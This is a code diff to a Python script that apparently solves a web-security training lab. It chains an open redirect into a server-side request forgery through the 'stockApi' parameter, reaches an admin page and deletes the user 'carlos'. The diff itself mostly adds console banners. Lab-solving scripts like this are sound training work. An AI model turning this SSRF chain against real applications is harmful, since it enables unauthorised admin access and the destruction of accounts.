@@ -23,16 +23,21 @@ def pattern(regex: str) -> Callable[[str], bool]:
 
 
 def fetch_product(server):
+    title = "Fetch product"
+    console.print(f"{'─' * ((64 - len(title)) // 2)}'{title}'{'─' * ((64 - len(title)) // 2)}")
     response = requests.get(f"{server}/")
     html_document = html.fromstring(response.content)
     product = html_document.xpath("//section/div/a[contains(@href,'/product?productId=')]/@href")[0]
-    console.log("Selecting product...")
+    console.log("Product selected")
+    console.print(f"{'─' * 65}")
     return product
 
 
 def get_admin_page(product, server):
+    title = "Get admin page"
+    console.print(f"{'─' * ((63 - len(title)) // 2)}'{title}'{'─' * ((64 - len(title)) // 2)}")
     response = requests.get(f"{server}{product}")
-    console.log(f"Product page status code: {response.status_code}")
+    console.log(f"Get product page status code: {response.status_code}")
     html_document = html.fromstring(response.content)
     global open_redirect_link
     open_redirect_link = str(html_document.xpath("//div[@class='is-linkback']/a[contains(@href,'path=')]/@href")[0])
@@ -40,11 +45,14 @@ def get_admin_page(product, server):
     admin_page = requests.post(f"{server}/product/stock", data={
         'stockApi': urllib.parse.quote(link)
     })
-    console.log(f"Get Admin Page Status code: {admin_page.status_code}")
+    console.log(f"Get admin page Status code: {admin_page.status_code}")
+    console.print(f"{'─' * 65}")
     return admin_page
 
 
 def delete_user(admin_page, server):
+    title = "Delete user"
+    console.print(f"{'─' * ((64 - len(title)) // 2)}'{title}'{'─' * ((64 - len(title)) // 2)}")
     html_document = html.fromstring(admin_page.content)
     link = str(html_document.xpath("//div/a[contains(@href,'username=carlos')]/@href")[0])[1:]
     link = re.sub(r'path=.*', 'path=' + link, open_redirect_link)
@@ -53,6 +61,7 @@ def delete_user(admin_page, server):
         'stockApi': urllib.parse.quote(link)
     })
     console.log(f"Deleting user status code: {response.status_code}")
+    console.print(f"{'─' * 65}")
 
 
 def check_lab_solver(server):
@@ -82,8 +91,6 @@ def validate_server(server):
     if requests.get(f"{server}").status_code != 200:
         raise Exception("URL NOT VALID!")
 
-    return server
-
 
 @app.callback()
 def main(
@@ -94,7 +101,7 @@ def main(
             help=f"Vulnerable server ID"
         )
 ):
-    server = validate_server(server)
+    validate_server(server)
     if not is_lab_solved(server):
         with console.status("Fetching product..."):
             product = fetch_product(server)
